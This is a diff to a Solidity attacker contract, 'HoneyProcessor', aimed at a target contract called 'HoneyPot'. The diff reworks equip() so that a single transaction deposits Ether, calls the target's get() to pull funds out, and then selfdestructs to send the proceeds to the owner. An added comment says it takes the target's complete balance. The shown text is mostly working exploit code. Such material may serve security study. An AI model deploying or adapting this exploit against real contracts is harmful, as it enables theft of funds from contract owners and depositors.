@@ -6,7 +6,7 @@ contract HoneyProcessor {
     HoneyPot honeyPot;
     address owner;
     
-    function HoneyProcessor(address hp){
+    function HoneyProcessor(address hp) public {
         honeyPot = HoneyPot(hp);
         owner = msg.sender;
     }
@@ -16,22 +16,25 @@ contract HoneyProcessor {
         _;
     }
     
+    /* All actions required to take out complete balance from the target contract are
+       performed as a single transaction.
+    */
     function equip() payable public{
         require(honeyPot.balance%msg.value == 0);
         honeyPot.put.value(msg.value)();
+        attack();
+        destruct();
     }
     
-    function attack() public {
+    function attack() private {
         honeyPot.get();
     }
     
-    function getContBalance() public returns(uint) {
+    function getContBalance() public view returns(uint) {
         return honeyPot.balance;
     }
     
-    /* This function should be called by the contract owner once
-       the target contract is flushed out of all ethers */
-    function destruct() onlyOwner {
+    function destruct() public onlyOwner {
         selfdestruct(msg.sender);
     }
     
